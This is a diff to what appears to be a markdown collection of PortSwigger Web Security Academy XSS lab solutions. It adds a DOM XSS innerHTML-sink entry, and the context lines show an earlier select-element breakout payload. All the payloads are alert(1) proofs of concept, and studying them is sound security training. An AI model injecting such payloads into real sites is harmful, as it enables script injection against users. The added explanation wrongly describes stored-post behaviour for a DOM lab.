@@ -8,6 +8,7 @@
 - [Stored XSS into HTML context with nothing encoded](#stored-xss-into-html-context-with-nothing-encoded)
 - [DOM XSS in document.write sink using source location.search](#dom-xss-in-documentwrite-sink-using-source-locationsearch)
 - [DOM XSS in document.write sink using source location.search inside a select element](#dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element)
+- [DOM XSS in innerHTML sink using source location.search](#dom-xss-in-innerhtml-sink-using-source-locationsearch)
 
 ## Reflected XSS into HTML context with nothing encoded
 Reference: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
@@ -64,3 +65,12 @@ product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
 ```
 product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
 ```
+
+## DOM XSS in innerHTML sink using source location.search
+Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
+
+<!-- omit in toc -->
+### Solution
+1. Enter the following into the into the search box: ``<img src=1 onerror=alert(1)>``
+2. Click "Search".
+The value of the ``src`` attribute is invalid and throws an error. This triggers the ``onerror`` event handler, which then calls the ``alert()`` function. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post.
